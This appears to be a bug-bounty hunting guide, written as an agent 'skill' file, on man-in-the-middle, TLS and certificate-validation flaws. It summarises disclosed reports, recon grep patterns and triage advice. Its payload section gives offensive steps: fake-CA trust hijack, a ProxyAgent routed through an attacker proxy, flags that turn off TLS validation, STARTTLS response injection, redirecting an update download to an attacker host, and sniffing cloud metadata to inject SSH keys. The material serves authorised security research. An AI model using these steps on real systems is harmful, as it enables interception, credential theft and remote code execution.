---
name: hunt-mitm
description: "Hunting skill for Man-in-the-Middle / TLS / certificate-validation vulnerabilities, mined from 41 full disclosed bug-bounty reports (46 assigned). Covers insecure transport of auth tokens and reset links (Automattic #206650, Weblate #224287), plaintext software-update and dependency pipelines to RCE-as-root (PortSwigger #506161, IBB #608620 JVM ecosystem, Concrete CMS #982130, Phabricator #186352, Brave #272231), TLS-trust-model hijacking and pinning bypasses (curl --capath #3120969, CURL_CA_BUNDLE #3418776, Monero set_daemon #3686259, Burp collaborator CN #337680, Node.js TLS session reuse #811502), proxy/TLS-termination flaws (Undici ProxyAgent #1599063, https-proxy-agent non-200 CONNECT #541502, STARTTLS injection #1334763, TLS 1.3 session-ticket proxy mixup #1129529), HSTS-enforcement bypass in AV/TLS-intercepting products (#461780), mixed content and cookie-without-Secure (FanDuel #437800, WePay #503699, New Relic #700091, Veris #123748, Mail.ru #291522), container/Kubernetes network MitM (CAP_NET_RAW #899103, IPv6 rogue RA #819717, LoadBalancer/ExternalIPs #764986), WebSocket hijack (curl #3917775, Shopify PoS #423467), TFTP first-response and socketpair races (#4103651, #3148937), and dangling-CNAME takeover enabling trusted-origin MitM (registry.nodejs.org #340580). Opinionated about what actually pays: code-execution and credential-theft chains, certificate-validation bypasses, and real victim-action PoCs — versus best-practice noise (missing HSTS with no downgrade PoC, weak-cipher support without a decrypt, passive mixed content) that triage routinely closes as Info/OOS. Use to hunt and to TRIAGE these findings honestly before reporting."
sources: hackerone_public, portswigger_research, github, cve, mitre_cwe
report_count: 46
full_reports_read: 41
---

# HUNT-MITM — Man-in-the-Middle / TLS / Certificate Validation

This skill is built from 41 fully-read disclosed reports out of a 46-report corpus. It is
deliberately "reality-checked": in this class the majority of naive submissions are closed
as best-practice noise. The reports that actually paid share one trait — the researcher
showed a **real interception producing a real capability**. Everything below is organized
around reproducing that property.

---

## Crown Jewel Targets

This class pays when a plaintext channel or broken certificate check lets an attacker
**read or modify something that grants a real capability** — a session cookie, a reset
token, a downloaded binary, or a TLS-authenticated peer. From the 41 full reports, the
highest-value targets cluster into these groups:

- **Software-update and dependency-fetch pipelines.** Anything that downloads code, JARs,
  installers, or JSON update manifests over `http://` and then *executes or trusts* them.
  This is the single most reliable path to High/Critical:
  - PortSwigger's HTTP JAR resolution lets artifacts be substituted (#506161, $1,000).
  - The industry-wide JVM ecosystem report touched Apache, Eclipse, Pivotal/Spring,
    RedHat, Jenkins, JetBrains/Kotlin, Gradle, PayPal and Netflix (#608620, CVSS 7.1).
  - Concrete CMS fetched its update JSON over HTTP; tampering with the manifest plus an
    admin-configurable proxy produced RCE (#982130, CVSS 7.6).
  - Phabricator's install script downloaded binaries via HTTP and ran them under sudo —
    a plaintext MITM gave RCE as root (#186352, $300).
  - Brave's Windows installer fetched a .NET installer over `http://go.microsoft.com/...`
    and executed it (#272231).
  - Paragon used plain `git://` clones; an on-path attacker returns different content if
    the last commit is not checked against a known one (#181214).
  - Payouts in this group: $1,000, CVSS 7.1/7.6, $300. Highest-signal group in the corpus.

- **Auth-token delivery over plaintext.** Password-reset links and email-verification
  links sent with an `http://` scheme:
  - Automattic/Instagram Brand reset tokens delivered via an http Mandrill tracking link,
    redirecting to `http://en.instagram-brand.com/register/reset/<token>` → mass ATO
    (#206650, High).
  - Weblate confirmation links in http that auto-logged the user in on click (#224287).
  - Low effort, direct account-takeover impact — the link generator simply chose the
    wrong scheme.

- **TLS clients and HTTP libraries with broken validation.** These are library-level bugs
  with broad blast radius and the most respected findings in the set:
  - curl/libcurl CA-path and env-var trust hijack (#3120969 High, #3418776 Critical).
  - Node.js TLS session-reuse hostname-verification bypass (#811502 High).
  - Monero `set_daemon` ignoring `ssl_allowed_fingerprints` → wallet↔daemon pinning
    bypass (#3686259 high).
  - Burp Collaborator not validating certificate CN — a legitimate cert for another
    domain passes (#337680 Medium).

- **Proxy / TLS-termination implementations.**
  - Undici ProxyAgent: "trivial MitM of all HTTPS traffic sent to a proxy"; the proxy
    invisibly MITMs "secure" traffic (#1599063 High, CVSS 7.4, $1,000).
  - `https-proxy-agent` returning a socket without TLS upgrade on non-200 CONNECT,
    leaking Basic auth before encryption (#541502, CVSS 6.1).
  - curl STARTTLS response pipelining → mailbox/sent-mail forgery (#1334763, CVSS 5.3).
  - SMTP interaction theft via permissive mail relay (#953219; UniFi SMTP proxy #519582).
  - TLS 1.3 session tickets stored under the wrong proxy/destination SSL context
    (#1129529 Low).

- **Session cookies without `Secure` / mixed content on authenticated origins.**
  - Veris cookies sent over `http://` enabling session hijack and replay (#123748).
  - Mail.ru wildcard cert + unvalidated Host + user-controlled files + reflection →
    active-MitM XSS on the login page (#291522, $500).
  - Passive/active mixed content (FanDuel #437800 $100, WePay #503699, New Relic #700091).
  - These pay little alone but chain into ATO when a token rides on them.

- **Container / Kubernetes networks with raw packet capability.**
  - `hostNetwork=true` + `CAP_NET_RAW` to sniff and tamper with the cloud metadata
    service and gain root (#899103 CVSS 6.0).
  - IPv4 clusters MITM'd via IPv6 rogue router advertisements (#819717 CVSS 6.0).
  - LoadBalancer/ExternalIPs services used to intercept in-cluster traffic (#764986
    CVSS 6.6).

- **WebSocket / real-time messaging transports.**
  - Missing `Sec-WebSocket-Accept` verification enabling session hijack (#3917775).
  - The Shopify PoS relay-server attack that snooped raw WebSocket messages to take
    over communications (#423467 Medium).

- **HSTS-enforcement gaps in TLS-intercepting proxies / AV suites.** Kaspersky Internet
  Security ignoring `Strict-Transport-Security`, making normally immune sites
  interceptable after a certificate override (#461780 Medium). Interesting because it
  defeats an *existing* defense rather than the absence of one.

- **Device-pairing and hardware-wallet trust.** Sony WH-1000XM5 pairing-authentication
  flaw allowing a Raspberry Pi to pair outside pairing mode (#2642615 high); hardware
  wallets not checking unlock time when signing, enabling fund lockup (#817245 CVSS 6.6).

- **Dangling DNS / subdomain takeover as a MitM enabler.** `registry.nodejs.org` CNAME →
  Fastly takeover with no DNS ownership proof (#340580); combined with an http reset link
  (#206650) it shows how a trusted origin becomes an interception point.

- **Timing/response-race primitives.** curl's TFTP accepting a first response from any
  source IP (#4103651); the `Curl_socketpair()` bind/listen gap where another process
  connects first (#3148937). Lower frequency but decisive where a client is the target.

**Rule of thumb calibrated to this corpus:** findings that demonstrate *code execution,
credential/token theft, or a working interception of a trusted channel* are the ones that
paid. Plaintext that only exposes already-public data, weak-cipher *support*, and "missing
HSTS" with no downgrade PoC are consistently rated Info/Low or closed informative — see
#263553, where a 3DES/SWEET32 report was explicitly closed informative.

---

## Attack Surface Signals

### URL / scheme patterns to hunt

```text
http://  (any sensitive flow: reset link, verification, update manifest,
          installer, package repo, SMTP relay, webhook, API base URL)
git://   (unauthenticated VCS clone — server not verified)
ftp:// / tftp://   (no peer authentication — see #4103651 TFTP first-response)
ws://    (WebSocket without TLS / without Sec-WebSocket-Accept check)
http://169.254.169.254/...   (cloud metadata over plaintext, sniffed in #899103)
http://metadata.google.internal/...  (GCP metadata, same class)
http://go.microsoft.com/fwlink/...   (installer download, #272231)
http://mandrillapp.com/track/click/... (reset-token tracker hop, #206650)
```

### Code / config signals (grep for these)

```bash
# Insecure transport of code or credentials
grep -rE 'https?://[^"'"'"' ]+\.(jar|zip|exe|sh|deb|rpm|json)' build.gradle pom.xml *.sh
grep -rE 'git://|curl .* http://|wget http://|Invoke-WebRequest http://' .
grep -rE '(curl_exec|file_get_contents|urllib|requests\.get)\s*\(\s*["'"'"']http://' .
grep -rE 'install_rhel|install_ubuntu|NDP-.*-Web\.exe|Direct Download URL' .   # #186352 #272231 #982130

# Broken certificate validation
grep -rE 'CURLOPT_CAPATH|CURL_CA_BUNDLE|CURLOPT_CAINFO' .            # #3120969 #3418776
grep -rE 'rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*0' . # #1599063
grep -rE 'ssl_allowed_fingerprints|set_daemon|pinning|verify_mode|CERT_NONE' .   # #3686259
grep -rE 'curl\s+(-k|--insecure)|\bverify\s*=\s*False' .
grep -rE 'COMMON_NAME_INVALID|check_hostname\s*=\s*False|checkPeerCertificate' .
grep -rE "'session'\s*\)|getSessionCb|onConnectSecure|SSL_CB_HANDSHAKE_DONE" .   # #811502

# Proxy / TLS termination
grep -rE 'ProxyAgent|https-proxy-agent|CONNECT .* HTTP/1.1|http_proxy|https_proxy' .
grep -rE 'STARTTLS|pipelining|Curl_socketpair|CONNECT_PROXY_SSL|Curl_ssl_addsessionid' . # #1334763 #3148937 #1129529
```

### Cookie / header hygiene signals

```bash
grep -rE 'Set-Cookie' . | grep -v -i 'secure'   # missing Secure flag (#123748)
grep -rE 'Strict-Transport-Security' .            # absent / ignored (#461780)
grep -rE '<(script|img|iframe|link)[^>]+src=["'"'"']http://' .  # mixed content
grep -rE 'Access-Control-Allow-Origin|Vary:\s*Host|Host\s*header' . # origin confusion (#291522)
```

### Response / browser signals

```text
Browser console: "Mixed Content: ... loaded over HTTP" (active vs passive)
Chrome: NET::ERR_CERT_COMMON_NAME_INVALID (#504507)
Set-Cookie header lacking "Secure" / "HttpOnly"
http:// link in a password-reset or verification email body (#206650 #224287)
Redirect chain http:// → https:// that forwards the auth token in the first hop
HSTS preload status missing on auth/login subdomains
A listening port bound on :::5000 from netstat inside a PoS/app container (#423467)
An in-scope domain whose SAN omits it — "not currently protected by your SSL certificate" (#504507)
```

### Host / DNS signals

CNAME pointing at Fastly / S3 / GitHub Pages / Azure CDN / Heroku (#340580); wildcard cert
reused across user-file-hosting and auth domains (#291522); an IP that differs from the one
provided to the researcher (#268113); Certificate-Transparency entries not in the main
subdomain list. Missing CAA is recon intel only, NEVER a standalone finding.

### Tech-stack signals

- **Build systems** fetching dependencies without checksums/signatures (Maven/Ivy/Gradle,
  npm install scripts) → #506161 #608620.
- **Auto-updaters** that fetch a JSON manifest then a binary → #982130.
- **curl / libcurl** and anything setting CA paths or using proxies → #3120969 #3418776
  #1129529 #1334763 #3917775 #3148937 #4103651.
- **Node.js / Undici / https-proxy-agent** with proxy agents or
  `rejectUnauthorized:false` → #1599063 #541502 #811502.
- **Kubernetes / cloud** with `CAP_NET_RAW`, `hostNetwork:true`, IPv6 RAs, or exposed
  LoadBalancer/ExternalIPs → #899103 #819717 #764986.
- **Mail infrastructure** (SMTP/IMAP/POP3 with opportunistic STARTTLS) → #953219
  #1334763 #519582.
- **Certificate Transparency / dangling CNAMEs** → #340580 #504507.
- **Device firmware / hardware wallets / Bluetooth pairing** → #2642615 #817245.

### False-positive surface

Self-signed cert on a non-prod host; weak cipher *supported* with no decrypt PoC (#263553);
missing CAA; passive mixed content with no script execution (#437800 #700091); a cert CN
mismatch on a host nobody visits (#504507). Deprioritize all of these.

---

## Discovery Patterns From 41 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

Ranked by how often the technique appeared in the 41 full reports. For each surface,
"what to look for" is the concrete signal that led to a real finding in the corpus.

1. **Search / filter / sort through large datasets (18 reports).** Code-search results,
   Certificate-Transparency logs, dependency lists, email templates, subdomain
   inventories. *What to look for:* any `http://` URL in a sensitive context, a cert whose
   SAN omits an in-scope host (#504507), a CVE/CWE pattern (CWE-494/CWE-829), or a
   subdomain whose CNAME points at a claimable provider (#340580). Researchers described
   "searching" or "noticing while examining the domains in scope."

2. **Public code search (15 reports).** GitHub/GitLab source, build files, install
   scripts, open-source repos. *What to look for:* dependency resolution over plain HTTP
   (#506161), `http://` download-and-execute in install scripts (#186352 #272231),
   insecure TLS options (`--capath`, `CURL_CA_BUNDLE`, `rejectUnauthorized:false`)
   (#3120969 #3418776 #1599063), plain `git://` clones (#181214).

3. **Internal network access (10 reports).** Being inside a container, pod, or LAN.
   *What to look for:* `netstat` listening sockets and raw packet capture (#423467),
   plaintext metadata-service queries to `169.254.169.254` (#899103), unauthenticated
   services reachable at Layer 2, exposed LoadBalancer/ExternalIPs (#764986).

4. **Server-side rendering / URL fetching (10 reports).** Servers that fetch remote
   resources. *What to look for:* user-influenced URLs fetched by a headless renderer or
   proxy, no verification of fetched content integrity (#982130).

5. **Image processing (10 reports).** Image/proxy fetchers and their transitive TLS
   clients. *What to look for:* insecure defaults in the image-fetch stack's HTTP/TLS
   library, as tagged across #819717 and #506161.

6. **API endpoints (10 reports).** Endpoints accepting URLs, proxy settings, or daemon
   addresses. *What to look for:* a parameter that sets an outbound proxy or a TLS peer,
   and whether validation is performed (#1599063 #3686259).

7. **Redirect handling (10 reports).** `http → https` and tracker redirects. *What to
   look for:* the first hop leaking a reset token in cleartext before the HTTPS upgrade
   (#206650), or an insecure endpoint redirect chain (#272231 #764986).

8. **Proxy features (9 reports).** Configurable SMTP/HTTP proxy fields. *What to look
   for:* an attacker-controlled proxy that can record credentials (#519582), or a client
   that mishandles proxy TLS (#541502 #1599063).

9. **JS source review (7 reports).** Bundled client code and Node modules. *What to look
   for:* `rejectUnauthorized:false`, session reuse on `'session'` events (#811502),
   missing handshake verification (#3917775), ProxyAgent usage (#1599063).

10. **Session attacks (6 reports).** Cookie theft, session fixation, relay. *What to look
    for:* cookies without `Secure` (#123748), WebSocket sessions without handshake
    authentication (#423467 #3917775).

11. **Comment injection / stored content (6 + 5 reports).** Where attacker content
    persists in an HTTPS page or a config value persists unchecked. *What to look for:*
    unfiltered parameter reflection combined with wildcard cert + unvalidated Host
    (#291522), or stored cert pins that are silently ignored (#3686259).

12. **Cookie handling (5 reports).** Inspecting `Set-Cookie` and scope. *What to look
    for:* plain-text cookies submitted over `http://` (#123748), local settings cookies
    writable via HTTP (#54094).

13. **URL fetching / admin-internal / filter-bypass / SSO-OAuth (4 reports each).**
    Direct fetch endpoints, admin-only surfaces, bypassing host filters, and OAuth flows
    over weak transport. *What to look for:* unverified fetch targets, admin panels
    setting proxies (#982130), host-filter bypasses that reintroduce plaintext.

14. **Subdomain takeover / cloud metadata (3 each).** Dangling DNS and metadata
    endpoints. *What to look for:* claimable CNAMEs (#340580), plaintext metadata queries
    sniffed from a container (#899103), cert SAN gaps (#504507).

15. **Lower-frequency but decisive surfaces.** Weak ciphers (#263553), port-scanning /
    time-based races (#3148937 #4103651), dependency confusion (#340580 #541502),
    WebSocket (#3917775), device/Bluetooth pairing (#2642615), hardware-wallet signing
    (#817245), stack fingerprinting of source paths (#3686259 #268113). Check these when
    the target is a client, device, or native library rather than a web app.

### Feature-Based Discovery Signals (frequency-ranked table)

Counts are the number of full reports in the corpus whose technique tags include the
signal. "Why it matters / what to probe" maps each to a concrete action.

| Signal (technique tag) | # | Why it matters | What to probe |
|---|---|---|---|
| search-filter-sort | 18 | Researchers find MitM by *searching datasets* for plaintext URLs, weak cert config, or dangling DNS | Grep code search / CT logs / subdomain lists for `http://` in sensitive flows and cert SAN gaps |
| public-code-search | 15 | Open source leaks insecure transport and TLS options directly | `grep` repos for `http://` dependencies, `--capath`, `CURL_CA_BUNDLE`, `rejectUnauthorized:false` |
| internal-network | 10 | On-path position makes plaintext protocols trivially interceptable | Sniff `netstat`/raw sockets; check plaintext metadata (`169.254.169.254`) and DNS/DHCP |
| server-side-rendering | 10 | Server fetchers can be pointed at attacker content or fetch unverified code | Test URL-fetch endpoints and update manifests for integrity checks (#982130) |
| image-processing | 10 | Image/fetch stack often carries a TLS client with weak defaults | Inspect the HTTP/TLS library used by image fetchers for validation bypasses |
| api-endpoint | 10 | APIs expose proxy/peer settings that become interception controls | Fuzz proxy, endpoint, and daemon-address parameters for missing validation (#1599063 #3686259) |
| redirect-handling | 10 | The pre-upgrade hop leaks tokens in cleartext | Inspect full redirect chain of reset/verification emails for `http://` first hops (#206650) |
| proxy-feature | 9 | A configurable proxy is a ready-made MitM position | Set an attacker SMTP/HTTP proxy and capture credentials (#519582); test CONNECT handling (#541502) |
| js-source-review | 7 | Client/TLS code reveals skipped verification | Review session-reuse, `rejectUnauthorized`, and handshake callbacks (#811502 #3917775) |
| session-attack | 6 | Sessions become the payload when transport is weak | Look for cookie theft, relay, and WebSocket session hijack (#423467 #123748) |
| comment-injection | 6 | Stored attacker content + TLS confusion = origin XSS | Probe unfiltered reflection, wildcard certs, unvalidated Host (#291522) |
| stored | 5 | Persisted settings/pins are often silently ignored | Test whether stored cert pins/fingerprints are actually enforced (#3686259) |
| cookie-handling | 5 | Missing `Secure` / scope flaws turn a sniff into ATO | Inspect `Set-Cookie` and HTTP-side submission (#123748 #54094) |
| url-fetching | 4 | Fetchers of manifests/binaries are the RCE entry point | Tamper with fetched JSON to redirect the download URL (#982130) |
| admin-internal | 4 | Admins can configure proxies and update sources | Abuse admin proxy settings to become on-path (#982130) |
| filter-bypass | 4 | Host/transport filters can be sidestepped | Test alternate transports and host confusion that reintroduce plaintext (#3686259 #3917775) |
| sso-oauth | 4 | Auth flows over weak transport leak tokens | Trace OAuth/SSO redirects for `http://` callback hops |
| subdomain-takeover | 3 | A trusted origin under attacker control enables credible MitM/phishing | Resolve CNAMEs; look for claimable Fastly/S3/GitHub Pages targets (#340580) |
| cloud-metadata | 3 | Plaintext metadata queries are sniffable from a container | Sniff `169.254.169.254` traffic and tamper with responses for SSH keys/root (#899103) |
| blind-oob | 3 | TLS clients used for OOB callbacks can fail validation themselves | Connect to a collaborator with a wrong-CN valid cert (#337680) |
| cache-layer | 3 | Session/context caches can be poisoned across peers | Check session ticket / session cache scoping across proxy and destination (#1129529 #811502) |
| websocket | 2 | Real-time channels skip HTTP handshake checks | Omit/mismatch `Sec-WebSocket-Accept`, relay raw messages (#3917775 #423467) |
| dependency-confusion | 2 | Dependency resolution trusts an unauthenticated source | Point package/proxy resolution at an attacker-controlled host (#340580 #541502) |
| file-upload | 2 | Fetch/download paths blend with upload paths | Trace downloaded file write destination and execution (#4103651 #506161) |
| dom-based | 2 | Active content rewrites the DOM in the victim's browser | Confirm script (not image) mixed content on auth pages (#503699 #437800) |
| dos-resource | 2 | Resource exhaustion overlaps with cookie/session flaws | Note but deprioritize unless chained to a real interception (#123748 #268113) |
| stack-fingerprinting | 2 | Source paths reveal which vulnerable code version is deployed | Search exact file/function names from advisories in the target codebase (#3686259 #268113) |

The top three surfaces (search/filter/sort, public code search, internal network) account
for 43 of the tagged signals — start there. The long tail is for native clients/devices.

### Verbatim Discovery Clues

Real "how I found it" / root-cause lines, quoted verbatim from the disclosed reports. Every
bracketed ID is a real report in the corpus. These are the exact phrases researchers used —
they show the mental path from observation to finding.

- [#423467] I was able to build a relay server for the WebSocket and could snoop on the raw messages without any issue.
- [#340580] I recently found an abandoned and/or overlooked nodejs.
- [#340580] Fastly doesn't require any proof of DNS ownership to register new distributions that use a given domain, so I was able to effectively take it over.
- [#982130] I noticed that concrete5 fetches the update JSON scheme from www.
- [#2642615] Upon examining the Bluetooth packets, it appears that there is a flaw in the authentication process during reconnection of the WH-1000XM5.
- [#3148937] During the time between when the listening socket is bound and set to listen, and when the client socket tries to connect, there is a gap where any process could connect to the listening socket first.
- [#437800] While browsing the sites https://www.
- [#437800] com found a mixed content error on the site with HTTPS.
- [#608620] The list of projects I publicly disclosed the details of this vulnerability to on GitHub during my research can be found here:
- [#608620] There's more information about the scope of this vulnerability than what I was fully able to capture in the blog post.
- [#504507] While examining the domains that are in scope for Urban Dictionary, I noticed that https://urbandictionary.
- [#123748] I noticed that your cookies are stored in plain text, without a secure flag option.
- [#268113] 144:9001 -- a different IP address than the one I was provided.
- [#268113] In fact, the IP address that I was provided (144.
- [#3120969] The --capath option in cURL and CURLOPT_CAPATH in libcurl accept any directory path without validation.
- [#506161] Some of these projects contain build files that indicate that some of these projects are resolving dependencies over HTTP instead of HTTPS.
- [#337680] Burp is not validating correctly if the presented certificate in collaborator server.
- [#1599063] it allows for trivial MitM of all HTTPS traffic sent to a proxy with Undici's ProxyAgent API.

### Probe Checklist (15 concrete probes)

Run these in order; each maps to a real report and has a concrete pass/fail signal.

1. **Grep public repos** for `http://` JAR/exe/installer/JSON-manifest URLs without
   checksums (`CWE-494`). *Pass:* a download-and-execute chain over plaintext —
   #506161 #186352 #982130.
2. **Request a password reset / verification email** and confirm every link (including
   tracker redirects) uses `https://`. *Pass:* token in an `http://` hop — #206650 #224287.
3. **Inspect `Set-Cookie`** on both `https://` and `http://` variants; confirm `Secure` is
   set and the cookie is not submitted over plaintext — #123748.
4. **Open the login/auth page in a browser console** and record active vs passive
   mixed-content warnings. *Pass:* a script/image loaded over http — #437800 #503699
   #700091 #291522.
5. **Check HSTS** on auth subdomains and the preload list; look for TLS-intercepting
   products that ignore it — #461780.
6. **Run `testssl.sh`/`sslyze`** for protocol/cipher support. Treat support as hardening
   only; seek a real downgrade/decrypt PoC — #263553.
7. **Validate certificate CN/SAN** across every in-scope domain; flag any host that fails
   `NET::ERR_CERT_COMMON_NAME_INVALID` — #504507.
8. **Test curl/libcurl trust controls** (`--capath`, `CURL_CA_BUNDLE`, `--cacert`) with a
   fake root CA and see if an arbitrary HTTPS endpoint is trusted — #3120969 #3418776.
9. **Test TLS client validation flags** (`rejectUnauthorized:false`,
   `NODE_TLS_REJECT_UNAUTHORIZED=0`, session reuse on `'session'`) in Node/Undici code —
   #811502 #1599063.
10. **Test proxy CONNECT handling** — return a non-200 CONNECT and see if the socket is
    used without TLS upgrade, leaking Basic auth — #541502.
11. **Test STARTTLS injection** — pipeline a forged cleartext response ahead of the TLS
    handshake (IMAP/SMTP/POP3) — #1334763 #953219.
12. **Test certificate pinning enforcement** — supply an alternate daemon/CN with a
    different fingerprint and observe whether it is accepted — #3686259.
13. **From a container, check `CAP_NET_RAW` / `hostNetwork:true`** — sniff plaintext
    metadata and inject responses to provision SSH keys/root — #899103 #819717 #764986.
14. **Test WebSocket handshake** — omit/mismatch `Sec-WebSocket-Accept` and check whether
    the session is still accepted; try a relay server — #3917775 #423467.
15. **Resolve dangling CNAMEs** from CT logs, claim the provider resource, and serve a
    canary over the victim subdomain with valid TLS — #340580.

---

## Step-by-Step Hunting Methodology

1. **Pick a vantage point.** Decide whether the bug you are hunting is:
   - (a) a *server-side* insecure transport/config flaw you can trigger remotely
     (#206650 #982130 #506161),
   - (b) a *client/library* validation flaw you demonstrate with a local fake CA or MitM
     proxy (#3120969 #1599063 #3686259), or
   - (c) a *network-position* flaw requiring container/LAN access (#899103 #819717).
   Most paid reports are (a) or (b); (c) requires proving the privileged network position.

2. **Build a transport inventory.** For every sensitive flow (login, reset, verification,
   update, install, mail, proxy, WebSocket), record the scheme, the certificate, and
   whether integrity is verified. Use code search and the grep table above. The leading
   signal in this corpus was simply noticing `http://` where a secret or code rode on it.

3. **Follow the token.** For any email/SMS link, capture the full redirect chain in Burp.
   If a reset token appears in an `http://` hop — including a third-party tracker like
   `mandrillapp.com` — you have an ATO primitive. Check the HTTPS upgrade happens *before*
   the secret is transmitted, not after (#206650). For verification links, confirm the
   click does not auto-authenticate the user with a stolen token (#224287).

4. **Trace download-and-execute paths.** For updaters/installers, map: manifest URL →
   manifest contents → download URL → signature/checksum check → execution. Tamper with
   any plaintext hop. Concrete CMS's update JSON defined the download URL, and redirecting
   it plus a configurable proxy produced RCE (#982130); Phabricator and PortSwigger showed
   the same pattern for binaries/JARs (#186352 #506161); Brave's .NET installer chain
   went through `http://go.microsoft.com/fwlink/...` (#272231).

5. **Attack certificate validation in the client.** If the target uses curl/libcurl, Node,
   Undici, or a custom TLS client:
   - stand up a fake root CA (`openssl req -x509 ...`) and point the client's CA path/env
     at it (#3120969 #3418776);
   - for pinning, replace the expected daemon cert/fingerprint and confirm it is still
     accepted (#3686259);
   - for hostname verification, force a session reuse or a mismatched-CN certificate
     (#811502 #504507);
   - note that Burp's own collaborator failed CN checking — a usable template (#337680).

6. **Attack TLS termination and proxies.** Configure an attacker proxy and observe whether
   secrets are sent before/without TLS upgrade (#541502 #519582). With Undici-style
   ProxyAgent, confirm the proxy can invisibly MITM "HTTPS" traffic by presenting its own
   cert (#1599063). With STARTTLS, pipeline a forged cleartext command response before
   negotiation completes (#1334763). With TLS 1.3 session tickets, check whether proxy and
   destination contexts are mixed up (#1129529).

7. **Test enforcement layers.** Where HSTS is expected, use a TLS-intercepting product or
   certificate-override flow and confirm the site becomes interceptable (#461780). Where a
   `Secure` flag or CSP exists, confirm it cannot be bypassed by the HTTP variant
   (#123748 #291522). Where mixed content exists, upgrade passive to active to see if
   script execution is possible (#503699 #437800).

8. **Establish a real interception.** To prove MitM rather than theory, actually position
   yourself on-path (MitMProxy, a fake CA, a relay server) and show one of: decrypted
   session cookies/tokens, modified downloaded code executing, or a manipulated response
   reaching the victim (#423467 #982130 #899103). Avoid claiming "the URL is http" as the
   finding — show what an attacker *does* with it.

9. **Check for trusted-origin confusion.** Resolve in-scope CNAMEs and cert SANs; a
   subdomain takeover or a cert covering an unexpected host turns a benign mixed-content
   or redirect flaw into a credible phishing/session-theft channel (#340580 #504507
   #291522). For dangling records, confirm the provider is claimable before reporting.

10. **Look for client-side races and first-response bugs.** If the target is a native
    client, check for bind/listen gaps where another process can connect first
    (#3148937), and for protocols that accept a first response from any source IP
    (#4103651). These are low-frequency but decisive when present.

11. **Escalate the primitive.** Chain the interception:
    - reset-token capture → account takeover (#206650);
    - update-manifest tamper → RCE as root (#186352 #982130);
    - metadata sniff → SSH key/root on host (#899103);
    - WebSocket relay → communications takeover (#423467);
    - cookie theft → authenticated session replay (#123748);
    - pin/cert bypass → silent interception of a trusted peer (#3686259 #1599063).

12. **Triage against "does it pay?"** Before writing up, classify:
    - code-execution / token-theft / validation-bypass chains → report, High/Critical;
    - real victim-action interception with PoC → report, Medium–High;
    - best-practice-only findings (weak-cipher support, missing HSTS with no downgrade
      PoC, passive mixed content, cert CN mismatch on an unused host) → Info/Low, often
      OOS; do not spend a submission unless scope explicitly accepts and you have a PoC.
    #263553 is a real example of a correctly closed-informative 3DES report.

13. **Document the full chain** with the exact plaintext channel, the intercepted/modified
    value, and the post-exploitation result — screenshots of the fake-CA acceptance, the
    modified binary executing, or the relayed WebSocket message. For network bugs include
    the `netstat`/`tcpdump` transcript and the injected response (#899103 #423467).

---

## Payload & Detection Patterns

### Fake root CA / CA-path hijack (#3120969, #3418776)

```bash
# Create a fake root CA
openssl req -x509 -newkey rsa:2048 -nodes -keyout fake.key -out fake.crt \
  -subj "/CN=FakeMITMRoot" -days 365
mkdir -p /tmp/fake-ca && cp fake.crt /tmp/fake-ca

# Demonstrate ca-path trust hijack: curl trusts an endpoint signed by fake CA
curl --capath /tmp/fake-ca https://target.example/
# CURL_CA_BUNDLE=/tmp/fake-ca curl https://target.example/
# CURLOPT_CAPATH=/tmp/fake-ca  (libcurl equivalent)
# A server signed by this fake CA connects successfully and exposes decrypted data.
```

### Node / Undici validation bypass (#1599063, #811502)

```javascript
// ProxyAgent that invisibly MITMs "HTTPS"
const { ProxyAgent, request } = require('undici');
const dispatcher = new ProxyAgent('http://attacker-proxy:8080');
await request('https://target.example/', { dispatcher });   // proxy presents own cert

// Flags that disable validation
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
// https.get({ rejectUnauthorized: false, ... })

// TLS session reuse triggering hostname-verification bypass
socket.on('session', session => { /* reused even if onConnectSecure CN check failed */ });
```

### Proxy CONNECT / TLS-upgrade failure (#541502, #1599063)

```http
CONNECT www.google.com:443 HTTP/1.1
Host: www.google.com:443
```

Return a non-200 response. If the client hands back the raw socket and sends the request
in cleartext (e.g. a Basic auth header) before TLS upgrade, that is the finding.

### STARTTLS command injection (#1334763, #953219)

```text
S: 220 ready
C: STARTTLS
S: 220 ready<AUTHENTICATE PLAIN ... forged response pipelined here>
```

Use the curl test suite's IMAP FETCH case: the downloaded file contains "You've been
hacked!" instead of the requested mail. Impact is mailbox and sent-mail forgery. The
Postfix CVE-2011-0411 variant (#953219) shows the same class applied to SMTP credential
capture.

### Plaintext update-manifest tamper → RCE (#982130)

```text
1. Point the app's outgoing HTTP proxy at Burp (Admin → proxy settings).
2. Use match-and-replace to change version "8.5.4" -> "8" to get a valid JSON response.
3. Rewrite the "Direct Download URL" field to an attacker-controlled host.
4. App downloads the attacker file and writes it into the writable "updates" directory.
5. Trigger the update → attacker code executes (RCE).
Preconditions from the report: Administrator privileges; "updates" dir writable.
```

### Reset-token / cookie interception (#206650, #123748, #224287)

```text
http://mandrillapp.com/track/click/30956340/instagram-brand.com?p=<token>
  -> 302 -> http://en.instagram-brand.com/register/reset/<token>?email=<email>
# token is in the cleartext hop; replay to take over the account

# Verification-link variant: http:// link auto-logs the user in on click (#224287)

# Cookie hygiene check
curl -sI https://target/ | grep -i set-cookie     # must contain Secure; HttpOnly
curl -sI http://target/  | grep -i set-cookie     # cookie must NOT be sent over http
```

### Mixed content / origin confusion (#437800, #503699, #700091, #291522)

```html
< div class="post-image"><img src="http://.../logo.png" ...></div>   <!-- passive -->
< script src="http://malsup.github.com/jquery.cycle2.js"></script>  <!-- active -->
```

Combine wildcard cert + unvalidated `Host:` + user-controlled file hosting + unfiltered
`v=` parameter reflection to execute JS on the HTTPS login page under active MitM
(#291522). Passive image replacement only defaces; active script rewrites the DOM and can
steal data.

### Container network MitM (#899103, #819717, #764986)

```bash
# From a hostNetwork / CAP_NET_RAW container
netstat -an | egrep 'LISTEN[^I]'          # find listening services (e.g. :::5000)
tcpdump -i any -A 'host 169.254.169.254' # sniff plaintext metadata / SSH keys
# Inject forged responses to provision attacker SSH keys -> host root
# IPv4-only cluster: send rogue IPv6 router advertisements to become default router
```

### Dangling-CNAME takeover canary (#340580)

```bash
CNAME=$(dig +short CNAME sub.target.com | head -1)
# provider error fingerprint (e.g. Fastly "unknown domain") -> claim resource
curl -s https://sub.target.com/canary.txt   # must serve a string only you know
```

### Detection / triage helpers

```bash
curl -sI https://target/ | grep -i strict-transport-security
dig CAA target.com +short                # recon only; missing CAA is NOT a finding
